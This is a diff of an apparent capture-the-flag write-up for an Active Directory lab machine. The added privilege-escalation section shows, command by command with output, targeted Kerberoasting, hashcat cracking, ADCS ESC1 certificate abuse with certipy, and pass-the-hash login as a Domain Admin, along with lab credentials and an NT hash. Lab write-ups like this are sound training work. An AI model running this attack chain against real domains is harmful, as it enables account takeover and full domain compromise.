@@ -8,8 +8,7 @@ Level: Easy
 == Table of Contents
 - <<overview,Overview>>
 - <<enumeration,Enumeration>>
-- <<ad-enum,AD Enumeration>>
-- <<ad-access,AD Enumeration & Access>>
+- <<ad-enum,AD Enumeration & Access>>
 - <<privesc,Privilege Escalation>>
 - <<notes,Final Notes>>
 
@@ -153,7 +152,7 @@ Enumerated a new user `alt.svc` : `babygirl1`
 
 
 [[ad-enum]]
-== AD Enumeration
+== AD Enumeration & Access
 
 In Bloodhound looks like user `alt.svc` have `GenereticAll` privileges to user `YORINOBU`
 
@@ -182,22 +181,168 @@ SMB         10.1.173.11     445    DC01             NETLOGON        READ        
 SMB         10.1.173.11     445    DC01             SYSVOL          READ            Logon server share 
 ----
 
-New obtained user is `yorinobu` : 'fuckpass`
-
-
-
-
-
-
-
-[[ad-access]]
-== AD Enumeration & Access
-
+New obtained user is `yorinobu` : `fuckpass`
 
 
 
 [[privesc]]
 == Privilege Escalation
+
+Connect with `evil-winrm` as user `yorinobu` : `fuckpass`
+
+[sourse]
+----
+evil-winrm -i dc01.hacksmarter.local -u yorinobu -p fuckpass
+----
+
+In bloodhound enumerated that user `yorinobu` has a `GenereticWrite` perm over user `soulkiller.svc`
+
+ALso user `yorinobu` exist in group `Remote Desktop Users` so it can be connected by `rdp`
+
+[sourse]
+----
+xfreerdp /v:10.1.173.11  /u:yorinobu  /p:fuckpass /w:1920 /h:1080 /fonts /smart-sizing
+----
+
+
+How to exploit:
+
+    * Reset passwords using the userPassword attribute.
+    * Use the new password to log in as the target user.
+
+
+Download the tool — https://github.com/ShutdownRepo/targetedKerberoast
+
+Recommended to activate venv enviroment because it's python3 tool 
+
+[sourse]
+----
+python3 -m venv myenv  
+source myenv/bin/activate 
+pip3 install -r requirements.txt
+----
+
+[sourse]
+----
+(myenv) kali ~/hack_smarter/machines/Arasaka/targetedKerberoast $ python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'fuckpass' 
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (Soulkiller.svc)
+.
+.
+----
+
+Catch hash of user `Soulkiller.svc`
+
+Crack by `hashcat`
+
+[sourse]
+----
+hashcat hash.soul  /home/kali/wordlists/passwords/rockyou.txt
+----
+
+Check by `nxc`
+
+After reserting machine new ip `10.1.246.3`
+
+[sourse]
+----
+nxc smb 10.1.246.3  -u 'soulkiller.svc' -p 'MYpassword123#' --shares
+SMB         10.1.246.3      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)
+SMB         10.1.246.3      445    DC01             [+] hacksmarter.local\soulkiller.svc:MYpassword123# 
+SMB         10.1.246.3      445    DC01             [*] Enumerated shares
+SMB         10.1.246.3      445    DC01             Share           Permissions     Remark
+SMB         10.1.246.3      445    DC01             -----           -----------     ------
+SMB         10.1.246.3      445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.246.3      445    DC01             C$                              Default share
+SMB         10.1.246.3      445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.246.3      445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.246.3      445    DC01             SYSVOL          READ            Logon server share 
+----
+
+
+[sourse]
+----
+certipy-ad find -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -stdout -vulnerable -dc-ip 10.1.246.3
+[!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+----
+
+From privious connection to machine by `evil-winrm` enumerated a user `the_emperor` which exists in `Domain Admins` group if user will be compromised `Active Directory` will be obtained
+
+Catch `SID` of user `the_emperor`
+
+
+[sourse]
+----
+(myenv) kali ~/hack_smarter/machines/Arasaka/targetedKerberoast $ certipy-ad account -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip '10.1.246.3' -user 'the_emperor' read
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'the_emperor':
+    cn                                  : Saburo Arasaka
+    distinguishedName                   : CN=Saburo Arasaka,CN=Users,DC=hacksmarter,DC=local
+    name                                : Saburo Arasaka
+    objectSid                           : S-1-5-21-3154413470-3340737026-2748725799-1601 <-
+    sAMAccountName                      : the_emperor
+    userPrincipalName                   : the_emperor@hacksmarter.local
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-09-21T14:52:32+00:00
+    whenChanged                         : 2025-11-06T17:21:53+00:00
+----
+
+[sourse]
+----
+(myenv) kali ~/hack_smarter/machines/Arasaka $ certipy-ad req -u soulkiller.svc -p 'MYpassword123#' -ca hacksmarter-DC01-CA -target hacksmarter.local -template AI_Takeover -upn the_emperor@hacksmarter.local -sid S-1-5-21-3154413470-3340737026-2748725799-1601
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: hacksmarter.local.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 4
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'the_emperor@hacksmarter.local'
+[*] Certificate object SID is 'S-1-5-21-3154413470-3340737026-2748725799-1601'
+[*] Saving certificate and private key to 'the_emperor.pfx'
+[*] Wrote certificate and private key to 'the_emperor.pfx'
+----
+
+
+Grab hash of user `the_emperor`
+
+[sourse]
+----
+(myenv) kali ~/hack_smarter/machines/Arasaka $ certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.246.3
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'the_emperor@hacksmarter.local'
+[*]     SAN URL SID: 'S-1-5-21-3154413470-3340737026-2748725799-1601'
+[*]     Security Extension SID: 'S-1-5-21-3154413470-3340737026-2748725799-1601'
+[*] Using principal: 'the_emperor@hacksmarter.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'the_emperor.ccache'
+[*] Wrote credential cache to 'the_emperor.ccache'
+[*] Trying to retrieve NT hash for 'the_emperor'
+[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133
+----
+
+Can be connected wuth `evil-winrm` with this hash
+
+'Evil-winrm` connection with user `the_emperor`
+
+[sourse]
+----
+ evil-winrm -i dc01.hacksmarter.local -u the_emperor -H 'd87640b0d83dc7f90f5f30bd6789b133'
+
+*Evil-WinRM* PS C:\Users\the_emperor\Documents> 
+----
+
+
+User `the_emperor` has the same `privileges` as user `Administrator` so system is compromised
+
+
+`root flag -> C:\Users\Administrator\Desktop> cat root.txt`
 
 
 [[notes]]
